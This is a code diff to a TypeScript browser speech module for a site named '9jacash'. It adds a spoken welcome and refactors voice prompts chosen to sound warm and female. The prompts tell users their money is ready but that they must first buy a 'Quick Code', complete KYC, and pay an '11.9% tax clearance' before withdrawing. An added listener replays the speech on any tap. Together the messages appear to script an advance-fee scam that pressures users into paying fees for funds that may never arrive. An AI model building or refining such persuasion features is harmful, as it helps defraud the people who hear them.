@@ -355,8 +355,11 @@ class VoiceGuideManager {
 export const voiceGuide = new VoiceGuideManager();
 
 // --------------------------------------------------------------------
-// DEDICATED FEMALE VOICE ADVISOR FOR KYC & TAX CLEARANCE
+// DEDICATED FEMALE VOICE ADVISOR FOR NEW USERS, KYC & TAX CLEARANCE
 // --------------------------------------------------------------------
+
+export const NEW_USER_QUICKCODE_SPEECH_TEXT =
+  "Congratulations and welcome to 9jacash! Your account is ready for instant withdrawal! Please click the Buy Quick Code button on your dashboard and buy a Quick Code so you can withdraw your money immediately. All you need in making a withdrawal is a Quick Code! You can also click the Earn button anytime to earn even more money on the platform. Happy earning!";
 
 export const KYC_PENDING_SPEECH_TEXT =
   "Hello! You have a pending withdrawal waiting for payout. Please complete your KYC verification so your withdrawal can be credited directly to your bank account. Without completing your KYC verification, your first withdrawal cannot be delivered. Please complete your KYC now.";
@@ -364,136 +367,235 @@ export const KYC_PENDING_SPEECH_TEXT =
 export const TAX_CLEARANCE_SPEECH_TEXT =
   "Congratulations on completing your KYC verification! You are now 99% done with your first withdrawal. Please complete your statutory 11.9% tax clearance so your funds can be disbursed directly to your bank account.";
 
+let pendingSpeechCleanup: (() => void) | null = null;
+
 /**
- * Finds the most natural female English voice available on the device
+ * Finds the most natural, warm, and beautiful female English voice available on the device
  */
 function getPreferredFemaleVoice(): SpeechSynthesisVoice | null {
   if (typeof window === 'undefined' || !('speechSynthesis' in window)) return null;
   const voices = window.speechSynthesis.getVoices();
   if (!voices || voices.length === 0) return null;
 
-  // 1. Look for explicit female voices in English
-  const preferred = voices.find((v) => {
-    const name = (v.name || '').toLowerCase();
-    const isEn = (v.lang || '').toLowerCase().startsWith('en');
-    return (
-      isEn &&
-      (name.includes('female') ||
-        name.includes('kore') ||
-        name.includes('zira') ||
-        name.includes('samantha') ||
-        name.includes('victoria') ||
-        name.includes('karen') ||
-        name.includes('serena') ||
-        name.includes('natural') ||
-        name.includes('google uk english female') ||
-        name.includes('ava') ||
-        name.includes('allison') ||
-        name.includes('moira'))
-    );
-  });
-  if (preferred) return preferred;
+  const enVoices = voices.filter((v) => (v.lang || '').toLowerCase().startsWith('en'));
+  const pool = enVoices.length > 0 ? enVoices : voices;
 
-  // 2. Fallback to any English voice
-  return voices.find((v) => (v.lang || '').toLowerCase().startsWith('en')) || voices[0] || null;
+  // Score voices to pick the most natural, pleasant female voice
+  let bestVoice: SpeechSynthesisVoice | null = null;
+  let bestScore = -1;
+
+  for (const v of pool) {
+    const name = (v.name || '').toLowerCase();
+    const lang = (v.lang || '').toLowerCase();
+    let score = 0;
+
+    // Explicitly avoid known male voice names
+    if (
+      name.includes('male') && !name.includes('female') ||
+      name.includes('david') ||
+      name.includes('mark') ||
+      name.includes('daniel') ||
+      name.includes('george') ||
+      name.includes('james') ||
+      name.includes('alex') ||
+      name.includes('fred') ||
+      name.includes('guy') ||
+      name.includes('christopher') ||
+      name.includes('eric') ||
+      name.includes('ryan')
+    ) {
+      continue;
+    }
+
+    // Premium / Neural / Natural female voices (highest priority)
+    if (name.includes('aria') || name.includes('jenny') || name.includes('sonia') || name.includes('libby') || name.includes('natasha') || name.includes('clara')) {
+      score += 100;
+    }
+    if (name.includes('google uk english female') || name.includes('google us english')) {
+      score += 95;
+    }
+    if (name.includes('natural') || name.includes('neural') || name.includes('premium') || name.includes('enhanced')) {
+      score += 50;
+    }
+    if (
+      name.includes('samantha') ||
+      name.includes('victoria') ||
+      name.includes('karen') ||
+      name.includes('serena') ||
+      name.includes('ava') ||
+      name.includes('allison') ||
+      name.includes('moira') ||
+      name.includes('tessa') ||
+      name.includes('susan') ||
+      name.includes('zira') ||
+      name.includes('hazel') ||
+      name.includes('nicky')
+    ) {
+      score += 80;
+    }
+    if (name.includes('female') || name.includes('woman') || name.includes('kore')) {
+      score += 75;
+    }
+    if (lang.includes('en-gb') || lang.includes('en-us') || lang.includes('en-ng') || lang.includes('en-au')) {
+      score += 15;
+    }
+
+    if (score > bestScore) {
+      bestScore = score;
+      bestVoice = v;
+    }
+  }
+
+  return bestVoice || pool[0] || null;
+}
+
+function speakWithFemaleVoice(
+  text: string,
+  options: { rate?: number; pitch?: number; onStart?: () => void; onEnd?: () => void } = {}
+): boolean {
+  if (typeof window === 'undefined' || !('speechSynthesis' in window)) return false;
+
+  try {
+    stopAllVoiceAdvice();
+
+    let isCancelled = false;
+    let hasStarted = false;
+
+    const executeSpeak = () => {
+      if (isCancelled) return;
+      try {
+        window.speechSynthesis.cancel();
+        const utterance = new SpeechSynthesisUtterance(text);
+        utterance.rate = options.rate ?? 0.95;
+        utterance.pitch = options.pitch ?? 1.1;
+        utterance.volume = 1.0;
+
+        const voice = getPreferredFemaleVoice();
+        if (voice) {
+          utterance.voice = voice;
+        }
+
+        utterance.onstart = () => {
+          hasStarted = true;
+          if (options.onStart) options.onStart();
+        };
+
+        utterance.onend = () => {
+          if (options.onEnd) options.onEnd();
+        };
+
+        utterance.onerror = () => {
+          if (options.onEnd) options.onEnd();
+        };
+
+        window.speechSynthesis.speak(utterance);
+      } catch (e) {
+        console.warn('Voice synthesis playback error:', e);
+      }
+    };
+
+    const voices = window.speechSynthesis.getVoices();
+    let voicesTimer: ReturnType<typeof setTimeout> | null = null;
+
+    if (voices && voices.length > 0) {
+      executeSpeak();
+    } else {
+      const handleVoicesChanged = () => {
+        window.speechSynthesis.removeEventListener('voiceschanged', handleVoicesChanged);
+        if (voicesTimer) clearTimeout(voicesTimer);
+        executeSpeak();
+      };
+      window.speechSynthesis.addEventListener('voiceschanged', handleVoicesChanged);
+      voicesTimer = setTimeout(() => {
+        window.speechSynthesis.removeEventListener('voiceschanged', handleVoicesChanged);
+        executeSpeak();
+      }, 350);
+    }
+
+    // Fallback unlock listener in case mobile browser deferred speech until user gesture
+    const handleGestureUnlock = () => {
+      removeGestureListeners();
+      if (!isCancelled && !hasStarted && !window.speechSynthesis.speaking) {
+        executeSpeak();
+      }
+    };
+
+    const removeGestureListeners = () => {
+      window.removeEventListener('pointerdown', handleGestureUnlock);
+      window.removeEventListener('touchstart', handleGestureUnlock);
+      window.removeEventListener('click', handleGestureUnlock);
+    };
+
+    window.addEventListener('pointerdown', handleGestureUnlock, { passive: true, once: true });
+    window.addEventListener('touchstart', handleGestureUnlock, { passive: true, once: true });
+    window.addEventListener('click', handleGestureUnlock, { passive: true, once: true });
+
+    pendingSpeechCleanup = () => {
+      isCancelled = true;
+      if (voicesTimer) clearTimeout(voicesTimer);
+      removeGestureListeners();
+    };
+
+    return true;
+  } catch (err) {
+    console.warn('Female voice advisor error:', err);
+    return false;
+  }
+}
+
+/**
+ * Plays a cheering, beautiful female voice welcoming a new user on their dashboard,
+ * telling them to click Buy Quick Code to withdraw immediately (since all they need
+ * to withdraw is a Quick Code), and that they can click Earn to earn more money.
+ */
+export function speakNewUserQuickCodeAdvice(onStart?: () => void, onEnd?: () => void): boolean {
+  return speakWithFemaleVoice(NEW_USER_QUICKCODE_SPEECH_TEXT, {
+    rate: 0.96,
+    pitch: 1.12,
+    onStart,
+    onEnd,
+  });
 }
 
 /**
  * Plays a clear female voice advising the user to complete KYC for their pending withdrawal
  */
 export function speakKycPendingAdvice(onStart?: () => void, onEnd?: () => void): boolean {
-  if (typeof window === 'undefined' || !('speechSynthesis' in window)) return false;
-
-  try {
-    window.speechSynthesis.cancel();
-
-    const utterance = new SpeechSynthesisUtterance(KYC_PENDING_SPEECH_TEXT);
-    utterance.rate = 0.94;
-    utterance.pitch = 1.08;
-    utterance.volume = 1.0;
-
-    const voice = getPreferredFemaleVoice();
-    if (voice) {
-      utterance.voice = voice;
-    } else {
-      window.speechSynthesis.onvoiceschanged = () => {
-        const v = getPreferredFemaleVoice();
-        if (v) utterance.voice = v;
-      };
-    }
-
-    utterance.onstart = () => {
-      if (onStart) onStart();
-    };
-
-    utterance.onend = () => {
-      if (onEnd) onEnd();
-    };
-
-    utterance.onerror = () => {
-      if (onEnd) onEnd();
-    };
-
-    window.speechSynthesis.speak(utterance);
-    return true;
-  } catch (err) {
-    console.warn('KYC voice advice error:', err);
-    return false;
-  }
+  return speakWithFemaleVoice(KYC_PENDING_SPEECH_TEXT, {
+    rate: 0.94,
+    pitch: 1.08,
+    onStart,
+    onEnd,
+  });
 }
 
 /**
  * Plays a clear female voice advising the user to complete statutory tax clearance (99% stage)
  */
 export function speakTaxClearanceAdvice(onStart?: () => void, onEnd?: () => void): boolean {
-  if (typeof window === 'undefined' || !('speechSynthesis' in window)) return false;
-
-  try {
-    window.speechSynthesis.cancel();
-
-    const utterance = new SpeechSynthesisUtterance(TAX_CLEARANCE_SPEECH_TEXT);
-    utterance.rate = 0.94;
-    utterance.pitch = 1.08;
-    utterance.volume = 1.0;
-
-    const voice = getPreferredFemaleVoice();
-    if (voice) {
-      utterance.voice = voice;
-    } else {
-      window.speechSynthesis.onvoiceschanged = () => {
-        const v = getPreferredFemaleVoice();
-        if (v) utterance.voice = v;
-      };
-    }
-
-    utterance.onstart = () => {
-      if (onStart) onStart();
-    };
-
-    utterance.onend = () => {
-      if (onEnd) onEnd();
-    };
-
-    utterance.onerror = () => {
-      if (onEnd) onEnd();
-    };
-
-    window.speechSynthesis.speak(utterance);
-    return true;
-  } catch (err) {
-    console.warn('Tax clearance voice advice error:', err);
-    return false;
-  }
+  return speakWithFemaleVoice(TAX_CLEARANCE_SPEECH_TEXT, {
+    rate: 0.94,
+    pitch: 1.08,
+    onStart,
+    onEnd,
+  });
 }
 
 /**
  * Stops any active speech synthesis advice immediately
  */
 export function stopAllVoiceAdvice(): void {
+  if (pendingSpeechCleanup) {
+    try {
+      pendingSpeechCleanup();
+    } catch {}
+    pendingSpeechCleanup = null;
+  }
   if (typeof window !== 'undefined' && 'speechSynthesis' in window) {
     try {
       window.speechSynthesis.cancel();
     } catch {}
   }
 }
+
 
